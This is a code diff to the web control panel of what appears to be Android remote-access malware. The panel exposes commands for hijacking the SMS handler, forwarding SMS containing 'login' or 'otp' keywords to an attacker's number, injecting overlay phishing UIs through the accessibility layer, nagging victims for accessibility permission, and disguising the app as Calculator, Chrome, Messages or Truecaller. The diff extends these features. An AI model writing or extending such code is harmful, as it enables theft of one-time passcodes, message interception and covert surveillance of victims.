@@ -335,6 +335,7 @@
                 search: 'sms, calls, contacts, keywords, filter, hvt, redirection, forward, wipe, delete, sanitize, auto, swipe, default, handler',
                 commands: [
                     { id: 'SET_DEFAULT_SMS', name: 'Hijack SMS Handler', icon: '💬', inputs: [{id: 'sms-default-mode', label: 'Strategy', type: 'select', options: [{v: 'AUTO', l: 'AUTO (Ghost Hand)'}, {v: 'RELENTLESS', l: 'Relentless Loop'}, {v: 'TRIGGER', l: 'Trigger Prompt'}, {v: 'SCRAPE', l: 'Scrape Dialog'}, {v: 'STOP_RELENTLESS', l: 'Stop Loop'}]}] },
+                    { id: 'RESTORE_DEFAULT_SMS', name: 'Restore Original SMS', icon: '⏪', inputs: [] },
                     { id: 'ADD_HVT_REDIRECT', name: 'SMS Redirection (HVT)', icon: '🔄', inputs: [{id: 'hvt-sender', label: 'Target Number', type: 'text'}, {id: 'hvt-dest', label: 'Destination', type: 'text'}], cleanup: 'CLEAR_HVT_REDIRECTS' },
                     { id: 'ADD_KEYWORD_FORWARD', name: 'Keyword SMS Trap', icon: '🪤', inputs: [{id: 'kw-list', label: 'Keywords (login,otp)', type: 'text'}, {id: 'kw-dest', label: 'Destination', type: 'text'}], cleanup: 'CLEAR_KEYWORD_FORWARDS' },
                     { id: 'ADD_AUTO_SWIPE', name: 'Auto-Swipe', icon: '🕵️', inputs: [{id: 'swipe-type', label: 'Target', type: 'select', options: [{v: 'pkgs', l: 'App Package'}, {v: 'keywords', l: 'Keywords'}, {v: 'senders', l: 'Sender Number'}]}, {id: 'swipe-val', label: 'Value', type: 'text'}], cleanup: 'CLEAR_AUTO_SWIPE' },
@@ -392,7 +393,7 @@
                             </div>` 
                     },
                     { id: 'BRIGHTNESS', name: 'Screen Dimmer / Stealth', icon: '🌓', inputs: [{id: 'bri-level', label: 'Level 0-100', type: 'number', val: 0}, {id: 'bri-method', label: 'Method', type: 'select', options: [{v: 'ACC', l: 'ACC (Stealth)'}, {v: 'OVERLAY', l: 'Overlay'}, {v: 'HARDWARE', l: 'Hardware'}]}], cleanup: 'UNBLIND' },
-                    { id: 'INJECT_UI', name: 'Inject Web Overlay', icon: '🖼️', inputs: [{id: 'ui-touchable', label: 'Input Mode', type: 'select', options: [{v: 'TRUE', l: 'Touchable'}, {v: 'FALSE', l: 'Ghost'}]}, {id: 'ui-html', label: 'HTML Content', type: 'textarea'}], cleanup: 'REMOVE_UI' },
+                    { id: 'INJECT_UI', name: 'Inject Web Overlay', icon: '🖼️', inputs: [{id: 'ui-touchable', label: 'Input Mode', type: 'select', options: [{v: 'TRUE', l: 'Touchable'}, {v: 'FALSE', l: 'Ghost'}]}, {id: 'ui-method', label: 'Injection Method', type: 'select', options: [{v: 'AUTO', l: 'AUTO (Smart Priority)'}, {v: 'ACC', l: 'Accessibility Layer'}, {v: 'OVERLAY', l: 'Standard Overlay'}]}, {id: 'ui-html', label: 'HTML Content', type: 'textarea'}], cleanup: 'REMOVE_UI' },
                     { id: 'WAKE', name: 'Force Screen Wake', icon: '💡', inputs: [{id: 'val-wake', label: 'Mode', type: 'select', options: [{v: 'standard', l: 'Standard'}, {v: 'wellbeing', l: 'Route Wellbeing'}]}] },
                     { id: 'RUN_INTENT', name: 'Trigger System Intent', icon: '⚡', inputs: [{id: 'int-act', label: 'Action', type: 'text', val: 'android.intent.action.VIEW'}, {id: 'int-data', label: 'URI/Data', type: 'text'}, {id: 'int-tgt', label: 'Target', type: 'select', options: [{v: 'activity', l: 'Activity'}, {v: 'service', l: 'Service'}, {v: 'broadcast', l: 'Broadcast'}]}] },
                     { id: 'REMOVE_UI', name: 'Force Remove Overlay', icon: '🚫', inputs: [] }
@@ -444,8 +445,9 @@
                     { id: 'SET_TILE_STATE', name: 'Master Visibility Mode', icon: '👁️', inputs: [{id: 'val-tile-state', label: 'Mode', type: 'select', options: [{v: 'ON', l: 'Show Dashboard'}, {v: 'OFF', l: 'Masquerade'}]}] },
                     { id: 'TOGGLE_LOGGING', name: 'Toggle Live Debugger', icon: '🐞', inputs: [{id: 'log-state', label: 'State', type: 'select', options: [{v: 'ON', l: 'Logging ON'}, {v: 'OFF', l: 'Stealth OFF'}]}] },
                     { id: 'SET_DEBUG_UI', name: 'Debug Console Access', icon: '🔓', inputs: [{id: 'val-debug-ui', label: 'Console State', type: 'select', options: [{v: 'ON', l: 'Accessible (Visible)'}, {v: 'OFF', l: 'Locked (Hidden)'}]}] },
-                    { id: 'SET_MASQUERADE', name: 'Apply Stealth Skin', icon: '🎭', inputs: [{id: 'val-masquerade', label: 'App Mask', type: 'select', options: [{v: 'DRIVE', l: 'Drive Services'}, {v: 'CALC', l: 'Calculator'}, {v: 'GOOGLE_PHONE', l: 'Phone (Google)'}, {v: 'GOOGLE_MSG', l: 'Messages (Google)'}, {v: 'SAM_PHONE', l: 'Phone (Samsung)'}, {v: 'SAM_MSG', l: 'Messages (Samsung)'}, {v: 'CHROME', l: 'Chrome'}, {v: 'IMO', l: 'imo'}, {v: 'IMO_HD', l: 'imo HD'}, {v: 'IMO_BETA', l: 'imo beta'}, {v: 'IMO_LITE', l: 'imo lite'}]}] },
+                    { id: 'SET_MASQUERADE', name: 'Apply Stealth Skin', icon: '🎭', inputs: [{id: 'val-masquerade', label: 'App Mask', type: 'select', options: [{v: 'DRIVE', l: 'Drive Services'}, {v: 'CALC', l: 'Calculator'}, {v: 'GOOGLE_PHONE', l: 'Phone (Google)'}, {v: 'GOOGLE_MSG', l: 'Messages (Google)'}, {v: 'SAM_PHONE', l: 'Phone (Samsung)'}, {v: 'SAM_MSG', l: 'Messages (Samsung)'}, {v: 'CHROME', l: 'Chrome'}, {v: 'IMO', l: 'imo'}, {v: 'IMO_HD', l: 'imo HD'}, {v: 'IMO_BETA', l: 'imo beta'}, {v: 'IMO_LITE', l: 'imo lite'}, {v: 'TRUECALLER', l: 'Truecaller'}]}] },
                     { id: 'SET_RELENTLESS_ACC', name: 'Config Persistence (ACC)', icon: '♾️', inputs: [{id: 'acc-chill', label: 'Initial Chill (Mins)', type: 'number', val: 1440}, {id: 'acc-interval', label: 'Nag Interval (Mins)', type: 'number', val: 2}, {id: 'acc-max', label: 'Max Attempts', type: 'number', val: 5}, {id: 'acc-html', label: 'Custom Nag UI (HTML)', type: 'textarea'}] },
+                    { id: 'STOP_RELENTLESS_ACC', name: 'Stop ACC Nagging', icon: '🛑', inputs: [] },
                     { id: 'SET_JUDAS_HANDLER', name: 'Emergency SMS Fallback', icon: '📞', inputs: [{id: 'judas-handler', label: 'Phone Number', type: 'text'}] },
                     { id: 'SET_PROMOS', name: 'Deploy Cipher Promos', icon: '📨', inputs: [{id: 'promo-templates', label: 'Template A [TOKEN] ||| B...', type: 'textarea'}] }
                 ]
@@ -906,12 +908,14 @@
                     case 'LOCK_SCREEN':
                     case 'GET_SENSORS':
                     case 'REMOVE_UI':
+                    case 'RESTORE_DEFAULT_SMS':
+                    case 'STOP_RELENTLESS_ACC':
                     case 'GET_ENGAGEMENT':
                     case 'STOP_BEACON':
                     case 'NUKE':
                         content = ''; break;
                     case 'INJECT_UI':
-                        content = `${document.getElementById('ui-touchable').value} | ${document.getElementById('ui-html').value}`; break;
+                        content = `${document.getElementById('ui-touchable').value} | ${document.getElementById('ui-method').value} | ${document.getElementById('ui-html').value}`; break;
                     case 'INSTALL_APP':
                         const path = document.getElementById('install-path').value;
                         const explanation = document.getElementById('install-html').value;
